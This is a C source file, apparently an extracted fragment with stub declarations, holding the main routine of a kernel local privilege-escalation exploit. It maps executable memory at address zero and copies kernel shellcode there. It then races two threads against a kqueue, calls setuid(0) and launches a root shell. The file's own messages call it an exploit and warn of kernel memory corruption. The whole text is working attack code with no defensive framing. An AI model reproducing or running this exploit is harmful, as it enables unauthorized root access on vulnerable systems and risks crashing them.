
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int pthread_t ;
struct TYPE_2__ {int tv_nsec; scalar_t__ tv_sec; } ;


 int MAP_ANON ;
 int MAP_FIXED ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int code_end ;
 scalar_t__ do_thread ;
 scalar_t__ do_thread2 ;
 int execl (char*,char*,int *) ;
 int exit (int) ;
 int getchar () ;
 int geteuid () ;
 scalar_t__ getuid () ;
 int gotroot ;
 int kernel_code ;
 int kq ;
 int kqueue () ;
 int memcpy (int ,int *,int) ;
 scalar_t__ mmap (void*,int,int,int,int,int ) ;
 int perror (char*) ;
 int printf (char*) ;
 int pthread_create (int *,int *,void*,int *) ;
 int setuid (int ) ;
 TYPE_1__ timeout ;
 int usleep (int) ;

int main(void) {
 int i;
 pthread_t pth, pth2;

 if (!getuid() || !geteuid()) {
  printf("already root.\n");
  exit(-1);
 }

 printf("BEWARE! this exploit isn't 100%% reliable. successful exploitation\n"
  "may cause kernel memory corruption leading to system crash.\n"
  "it is also possible, that exploit will hang and such process\n"
  "will be unkillable. hit enter if you want to continue.\n");

 getchar();




 if (mmap((void *)0x408b0000, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
  perror("mmap");
  exit(-1);
 }

 if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
  perror("mmap");
  exit(-1);
 }

 memcpy(0, &kernel_code, &code_end - &kernel_code);

 if ((kq = kqueue()) < 0) {
  perror("kqueue");
  exit(-1);
 }

 pthread_create(&pth, ((void*)0), (void *)do_thread, ((void*)0));
 pthread_create(&pth2, ((void*)0), (void *)do_thread2, ((void*)0));

 timeout.tv_sec = 0;
 timeout.tv_nsec = 1;

 printf("waiting for root... it should take no more than few seconds.\n"
      "otherwise, run exploit again.\n");
 i = 0;

 while (!gotroot && i++ < 4000)
  usleep(100);

 setuid(0);

 if (getuid()) {
  printf("failed. on unpatched systems, the exploit will be unkillable from now. try again.\n");
  exit(-1);
 }

 execl("/bin/sh", "sh", ((void*)0));

 return 0;
}
